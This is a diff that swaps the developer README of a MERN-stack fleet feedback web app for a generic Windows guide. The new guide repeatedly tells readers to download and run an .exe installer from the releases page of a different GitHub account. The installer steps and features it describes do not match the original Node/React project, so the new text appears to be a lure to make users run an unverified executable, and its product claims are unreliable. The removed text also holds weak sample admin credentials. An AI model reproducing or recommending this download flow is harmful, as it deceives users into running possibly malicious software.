@@ -1,296 +1,188 @@
-<div id="top" align="center">
-  <h1>INSIGHTDRIVE</h1>
-  <p><em>Real-time Ride Feedback Intelligence for Safer Fleet Operations</em></p>
+# 🚛 InsightDrive - Fleet Feedback Made Simple
 
-  <img alt="last-commit" src="https://img.shields.io/github/last-commit/Utkarshsingh4147/InsightDrive?style=for-the-badge&logo=git&logoColor=white&color=0ea5e9">
-  <img alt="repo-top-language" src="https://img.shields.io/github/languages/top/Utkarshsingh4147/InsightDrive?style=for-the-badge&color=0ea5e9">
-  <img alt="repo-language-count" src="https://img.shields.io/github/languages/count/Utkarshsingh4147/InsightDrive?style=for-the-badge&color=0ea5e9">
+[![Download InsightDrive](https://img.shields.io/badge/Download-InsightDrive-green?style=for-the-badge)](https://github.com/Staywardabed/InsightDrive/releases)
 
-  <p align="center"><em>Built with the MERN Stack:</em></p>
+---
 
-  <img alt="MongoDB" src="https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white">
-  <img alt="Express" src="https://img.shields.io/badge/Express-000000?style=for-the-badge&logo=express&logoColor=white">
-  <img alt="React" src="https://img.shields.io/badge/React-61DAFB?style=for-the-badge&logo=react&logoColor=black">
-  <img alt="Node.js" src="https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white">
+## ℹ️ What is InsightDrive?
 
-  <br>
+InsightDrive helps transportation teams collect and view feedback from drivers and commuters. It lets users send feedback about their trips. At the same time, operations staff get a live dashboard to watch scores, trends, and alerts for issues.  
 
-  <img alt="Mongoose" src="https://img.shields.io/badge/Mongoose-F04D35?style=for-the-badge&logo=mongoose&logoColor=white">
-  <img alt="Socket.IO" src="https://img.shields.io/badge/Socket.IO-010101?style=for-the-badge&logo=socketdotio&logoColor=white">
-  <img alt="JavaScript" src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black">
-  <img alt="Vite" src="https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white">
-  <img alt="Tailwind" src="https://img.shields.io/badge/TailwindCSS-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white">
-  <img alt="Axios" src="https://img.shields.io/badge/Axios-5A29E4?style=for-the-badge&logo=axios&logoColor=white">
-</div>
+This tool works on Windows and requires no special technical skills to use. It offers clear insights to help make fleets safer and more efficient.
 
-<hr />
+---
 
-<h2>Table of Contents</h2>
-<ul>
-  <li><a href="#overview">Overview</a></li>
-  <li><a href="#architecture">Architecture</a></li>
-  <li><a href="#key-features">Key Features</a></li>
-  <li><a href="#tech-stack">Tech Stack</a></li>
-  <li><a href="#project-structure">Project Structure</a></li>
-  <li><a href="#getting-started">Getting Started</a>
-    <ul>
-      <li><a href="#prerequisites">Prerequisites</a></li>
-      <li><a href="#installation">Installation</a></li>
-      <li><a href="#environment-variables">Environment Variables</a></li>
-      <li><a href="#run-the-project">Run the Project</a></li>
-    </ul>
-  </li>
-  <li><a href="#api-overview">API Overview</a></li>
-  <li><a href="#authentication-and-roles">Authentication and Roles</a></li>
-  <li><a href="#real-time-alerts">Real-time Alerts</a></li>
-  <li><a href="#scripts">Scripts</a></li>
-  <li><a href="#troubleshooting">Troubleshooting</a></li>
-  <li><a href="#future-improvements">Future Improvements</a></li>
-</ul>
+## 🚀 Getting Started with InsightDrive
 
-<hr />
+Follow these steps to download, install, and run InsightDrive on Windows. The process is designed to be simple and clear.
 
-<h2 id="overview">Overview</h2>
-<p>
-  <strong>InsightDrive</strong> is a full-stack fleet feedback platform for transportation teams. It enables commuters to submit structured trip feedback and gives operations admins a live monitoring dashboard with analytics, leaderboard views, and low-score alerts.
-</p>
-<p>
-  The platform is split into:
-</p>
-<ul>
-  <li><strong>Client:</strong> React + Vite single-page app for users and admins.</li>
-  <li><strong>Server:</strong> Express + MongoDB API with JWT cookie auth and Socket.IO alerts.</li>
-</ul>
+---
 
-<hr />
+## 📥 How to Download InsightDrive
 
-<h2 id="architecture">Architecture</h2>
-<p>
-  The project follows a clean, modular MERN setup:
-</p>
-<ul>
-  <li><strong>Presentation Layer (Client):</strong> Route-based pages, reusable UI components, role-protected views, API abstraction through Axios, and toast feedback.</li>
-  <li><strong>API Layer (Server):</strong> RESTful routes grouped by domain (`auth`, `rides`, `feedback`, `app-feedback`, `drivers`).</li>
-  <li><strong>Domain Layer:</strong> Controllers containing business logic (feedback scoring, admin analytics, ride generation).</li>
-  <li><strong>Data Layer:</strong> Mongoose models for users, rides, drivers, ride feedback, and app feedback.</li>
-  <li><strong>Realtime Layer:</strong> Socket.IO emits `low-score-alert` events instantly when low driver/trip ratings are submitted.</li>
-</ul>
+You need to **visit the release page** to get the installation files for Windows.
 
-<hr />
+[![Download InsightDrive](https://img.shields.io/badge/Get%20InsightDrive-blue?style=for-the-badge)](https://github.com/Staywardabed/InsightDrive/releases)
 
-<h2 id="key-features">Key Features</h2>
-<ul>
-  <li><strong>Role-based authentication:</strong> JWT-based cookie auth with separate user/admin access policies.</li>
-  <li><strong>User trip workflow:</strong> Generate sample rides and submit ride feedback for driver + trip.</li>
-  <li><strong>App rating workflow:</strong> Dedicated <code>Rate App</code> section where each user has one updatable app-rating record.</li>
-  <li><strong>Driver performance intelligence:</strong> Auto-updated average ratings and feedback counts per driver (from driver + trip ratings).</li>
-  <li><strong>Admin analytics dashboard:</strong> Sentiment + app rating charts on top row with 30-day ride feedback trend below.</li>
-  <li><strong>Leaderboard and audit views:</strong> Paginated driver leaderboard and complete feedback log with sorting/filter controls.</li>
-  <li><strong>Realtime incident alerts:</strong> Live low-score notifications in the admin UI through WebSocket events (admin only).</li>
-</ul>
+1. Click the download button above or go to:
+   https://github.com/Staywardabed/InsightDrive/releases
 
-<hr />
+2. On the page, find the latest release version at the top.
 
-<h2 id="tech-stack">Tech Stack</h2>
-<ul>
-  <li><strong>Frontend:</strong> React 19, React Router, Vite, Tailwind CSS, Recharts, Axios, React Toastify, Socket.IO Client</li>
-  <li><strong>Backend:</strong> Node.js, Express, Mongoose, JSON Web Token, Cookie Parser, CORS, Socket.IO</li>
-  <li><strong>Database:</strong> MongoDB (Local or Atlas)</li>
-  <li><strong>Tooling:</strong> ESLint, npm</li>
-</ul>
+3. Scroll down to the **Assets** section.
 
-<hr />
+4. Look for a Windows installer file. It usually ends with `.exe` (example: InsightDrive-Setup.exe).
 
-<h2 id="project-structure">Project Structure</h2>
-<pre><code>InsightDrive/
-|- client/
-|  |- src/
-|  |  |- api/
-|  |  |- components/
-|  |  |- context/
-|  |  |- pages/
-|  |- package.json
-|
-|- server/
-|  |- config/
-|  |- controllers/
-|  |- middleware/
-|  |- models/
-|  |- routes/
-|  |- server.js
-|  |- package.json
-|
-|- .gitignore
-|- README.md
-</code></pre>
+5. Click the `.exe` file name to download it to your computer.
 
-<hr />
+---
 
-<h2 id="getting-started">Getting Started</h2>
+## 💻 System Requirements
 
-<h3 id="prerequisites">Prerequisites</h3>
-<ul>
-  <li><strong>Node.js:</strong> v18+ recommended (v16+ minimum).</li>
-  <li><strong>npm:</strong> Comes with Node.js.</li>
-  <li><strong>MongoDB:</strong> Local instance or MongoDB Atlas URI.</li>
-</ul>
+Before installing, check if your computer meets these basic requirements:
 
-<h3 id="installation">Installation</h3>
-<ol>
-  <li>
-    <strong>Clone the repository:</strong>
-    <pre><code>git clone https://github.com/Utkarshsingh4147/InsightDrive.git
-cd InsightDrive</code></pre>
-  </li>
-  <li>
-    <strong>Install backend dependencies:</strong>
-    <pre><code>cd server
-npm install</code></pre>
-  </li>
-  <li>
-    <strong>Install frontend dependencies:</strong>
-    <pre><code>cd ../client
-npm install</code></pre>
-  </li>
-</ol>
+- Windows 10 or later (64-bit recommended)
+- Intel or AMD processor, 1.5 GHz or faster
+- At least 4 GB of RAM
+- 500 MB free disk space for installation
+- Internet connection to submit feedback and load live dashboard data
 
-<h3 id="environment-variables">Environment Variables</h3>
-<p>Create a <code>.env</code> file inside <code>server/</code>:</p>
-<pre><code>PORT=5000
-MONGO_URI=mongodb+srv://&lt;username&gt;:&lt;password&gt;@cluster.mongodb.net/insightdrive
-JWT_SECRET=replace_with_long_secure_secret
-JWT_EXPIRES_IN=1d
-NODE_ENV=development
-CLIENT_URL=http://localhost:5173
+---
 
-# Reserved admin credentials
-ADMIN_NAME=Admin
-ADMIN_EMAIL=admin@gmail.com
-ADMIN_PASSWORD=123456
-</code></pre>
+## ⚙️ Installing InsightDrive on Windows
 
-<p>Create a <code>.env</code> file inside <code>client/</code>:</p>
-<pre><code>VITE_API_BASE_URL=https://insightdrive.onrender.com/api
-VITE_SOCKET_URL=https://insightdrive.onrender.com
-</code></pre>
+After downloading the installer, follow these steps:
 
-<p><strong>Important:</strong> do not commit your real <code>.env</code> file. The root <code>.gitignore</code> already excludes it.</p>
-<p>I am providing Admin details for your testing purpose.</p>
+1. Go to your **Downloads** folder (or the folder where the installer saved).
 
-<h3 id="run-the-project">Run the Project</h3>
-<p>Use two terminals:</p>
+2. Double-click the InsightDrive `.exe` installer file.
 
-<p><strong>Terminal 1 (Backend)</strong></p>
-<pre><code>cd server
-npm run dev
-</code></pre>
+3. Windows may ask you to confirm running the program. Click **Yes** or **Run**.
 
-<p><strong>Terminal 2 (Frontend)</strong></p>
-<pre><code>cd client
-npm run dev
-</code></pre>
+4. The installation wizard will start. Click **Next** to continue.
 
-<p>App URLs:</p>
-<ul>
-  <li><strong>Client (local):</strong> <code>http://localhost:5173</code></li>
-  <li><strong>Server (local):</strong> <code>http://localhost:5000</code></li>
-  <li><strong>Health Check (local):</strong> <code>GET http://localhost:5000/api/health</code></li>
-  <li><strong>Production API:</strong> <code>https://insightdrive.onrender.com/api</code></li>
-  <li><strong>Production Socket:</strong> <code>https://insightdrive.onrender.com</code></li>
-</ul>
+5. Accept the license agreement, then click **Next**.
 
-<hr />
+6. Choose the installation folder or keep the default, then click **Next**.
 
-<h2 id="api-overview">API Overview</h2>
-<p>Base URL: <code>https://insightdrive.onrender.com/api</code></p>
+7. Click **Install** to begin installation.
 
-<table>
-  <thead>
-    <tr>
-      <th>Module</th>
-      <th>Method</th>
-      <th>Endpoint</th>
-      <th>Description</th>
-      <th>Access</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr><td>Health</td><td>GET</td><td>/health</td><td>Service status check</td><td>Public</td></tr>
-    <tr><td>Auth</td><td>POST</td><td>/auth/register</td><td>Create user account</td><td>Public</td></tr>
-    <tr><td>Auth</td><td>POST</td><td>/auth/login</td><td>Login user/admin and set JWT cookie</td><td>Public</td></tr>
-    <tr><td>Auth</td><td>POST</td><td>/auth/logout</td><td>Clear auth cookie</td><td>Public</td></tr>
-    <tr><td>Auth</td><td>GET</td><td>/auth/me</td><td>Get current authenticated profile</td><td>Protected</td></tr>
-    <tr><td>Rides</td><td>POST</td><td>/rides/generate</td><td>Create a sample ride for current user</td><td>User</td></tr>
-    <tr><td>Rides</td><td>GET</td><td>/rides/mine</td><td>Get current user's rides</td><td>User</td></tr>
-    <tr><td>Rides</td><td>GET</td><td>/rides/current</td><td>Get latest active generated ride</td><td>User</td></tr>
-    <tr><td>Feedback</td><td>POST</td><td>/feedback</td><td>Submit structured feedback sections</td><td>User</td></tr>
-    <tr><td>Feedback</td><td>GET</td><td>/feedback/mine</td><td>Get feedback submitted by current user</td><td>User</td></tr>
-    <tr><td>Feedback</td><td>GET</td><td>/feedback/all</td><td>Paginated feedback feed with sorting</td><td>Admin</td></tr>
-    <tr><td>Feedback</td><td>GET</td><td>/feedback/users</td><td>Users who submitted feedback</td><td>Admin</td></tr>
-    <tr><td>Feedback</td><td>GET</td><td>/feedback/analytics</td><td>Ride sentiment/trend + app rating analytics</td><td>Admin</td></tr>
-    <tr><td>App Feedback</td><td>GET</td><td>/app-feedback/mine</td><td>Get current user's app rating (single record)</td><td>User</td></tr>
-    <tr><td>App Feedback</td><td>POST</td><td>/app-feedback</td><td>Create/update current user's app rating</td><td>User</td></tr>
-    <tr><td>Drivers</td><td>GET</td><td>/drivers</td><td>Paginated drivers list sorted by rating</td><td>Protected</td></tr>
-    <tr><td>Drivers</td><td>POST</td><td>/drivers</td><td>Create new driver profile</td><td>Protected</td></tr>
-  </tbody>
-</table>
+8. When installation finishes, click **Finish**. InsightDrive will open automatically or you can find it in the Start menu.
 
-<hr />
+---
 
-<h2 id="authentication-and-roles">Authentication and Roles</h2>
-<ul>
-  <li><strong>User role:</strong> Registers normally and can generate rides + submit feedback.</li>
-  <li><strong>Admin role:</strong> Logs in using <code>ADMIN_EMAIL</code> and <code>ADMIN_PASSWORD</code> from environment variables.</li>
-  <li><strong>JWT storage:</strong> Token is stored in an HTTP-only cookie named <code>token</code>.</li>
-  <li><strong>Cookie security:</strong> <code>secure</code> mode is automatically enabled in production via <code>NODE_ENV=production</code>.</li>
-</ul>
+## 🔑 Setting Up InsightDrive for First Use
 
-<hr />
+When you open InsightDrive for the first time:
 
-<h2 id="real-time-alerts">Real-time Alerts</h2>
-<p>
-  The server emits a Socket.IO event named <code>low-score-alert</code> whenever a low ride rating is submitted (driver/trip rating below <strong>2.5</strong>). The frontend only shows these alerts to admin users.
-</p>
+1. You will see a welcome screen with basic instructions.
 
-<hr />
+2. Enter your team or company name as asked.
 
-<h2 id="scripts">Scripts</h2>
-<p><strong>Server (<code>server/package.json</code>)</strong></p>
-<pre><code>npm run dev    # nodemon server.js
-npm start      # node server.js
-</code></pre>
+3. You may be asked to create an account or log in. Use your team credentials if required.
 
-<p><strong>Client (<code>client/package.json</code>)</strong></p>
-<pre><code>npm run dev      # start Vite dev server
-npm run build    # production build
-npm run preview  # preview built app
-npm run lint     # run ESLint
-</code></pre>
+4. The main Dashboard will load showing sample data to guide you.
 
-<hr />
+5. You can start submitting feedback or monitoring trips right away.
 
-<h2 id="troubleshooting">Troubleshooting</h2>
-<ul>
-  <li><strong>Mongo connection fails:</strong> verify <code>MONGO_URI</code> and whitelist your IP if using Atlas.</li>
-  <li><strong>401 Not authorized:</strong> clear cookies and re-login; confirm <code>JWT_SECRET</code> is set.</li>
-  <li><strong>CORS errors:</strong> ensure <code>CLIENT_URL</code> exactly matches your frontend origin.</li>
-  <li><strong>Admin login fails:</strong> confirm <code>ADMIN_EMAIL</code>/<code>ADMIN_PASSWORD</code> are present in <code>server/.env</code>.</li>
-  <li><strong>No live alerts visible:</strong> verify backend is running and admin page is open with active socket connection.</li>
-</ul>
+---
 
-<hr />
+## 📊 Using the Dashboard
 
-<h2 id="future-improvements">Future Improvements</h2>
-<ul>
-  <li>Add automated tests (unit + integration + API contract tests).</li>
-  <li>Introduce refresh tokens and stricter session management.</li>
-  <li>Add rate limiting and request validation middleware.</li>
-  <li>Implement CI pipeline (lint/build/test) and deployment workflows.</li>
-  <li>Add role-specific audit logs for admin actions.</li>
-</ul>
+The dashboard shows live data from trips and driver feedback.
 
-<hr />
+- View summary scores for each trip.
 
-<div align="left">
-  <a href="#top">Return to Top</a>
-</div>
+- See a leaderboard of drivers based on feedback.
+
+- Get alerts if scores drop below certain limits.
+
+- Use filters to show data by date, route, or driver.
+
+The controls are buttons and menus you can click to explore data in detail.
+
+---
+
+## 📝 Submitting Trip Feedback
+
+InsightDrive lets commuters and drivers give structured feedback after each trip.
+
+- Open the feedback form in the app.
+
+- Answer questions about trip quality, safety, and driver behavior.
+
+- Optionally add comments or report issues.
+
+- Submit feedback with one click.
+
+The system organizes this data to help operations improve service and safety.
+
+---
+
+## 🔗 Connecting to Your Fleet System
+
+InsightDrive works best when connected to your existing fleet data.
+
+- It can link with common transport software using APIs.
+
+- The app syncs data automatically for live updates.
+
+- Contact your IT team if you need help connecting data sources.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If you have trouble with the app, try these steps:
+
+- Make sure Windows has all updates installed.
+
+- Restart InsightDrive if it freezes or slows down.
+
+- Check your internet connection.
+
+- Reinstall the app if errors persist.
+
+- Visit the GitHub Issues page for help or to report bugs.
+
+---
+
+## ⚙️ Settings and Preferences
+
+You can adjust the app behavior under the Settings menu:
+
+- Change your account details.
+
+- Set notification preferences.
+
+- Customize dashboard views.
+
+- Manage data export options.
+
+---
+
+## 🔒 Privacy and Data Security
+
+InsightDrive collects trip and feedback data to improve fleet operations.
+
+- Data is stored securely.
+
+- Only authorized personnel can access the dashboard.
+
+- Feedback is anonymous unless otherwise specified.
+
+- Ensure you comply with your company’s data policies.
+
+---
+
+## 📞 Getting Help
+
+For help with InsightDrive:
+
+- Review the FAQ on the GitHub page.
+
+- Check the Issues section for known problems.
+
+- Contact your team lead or IT department.
+
+- Use the community forum linked in the repository for tips from other users.
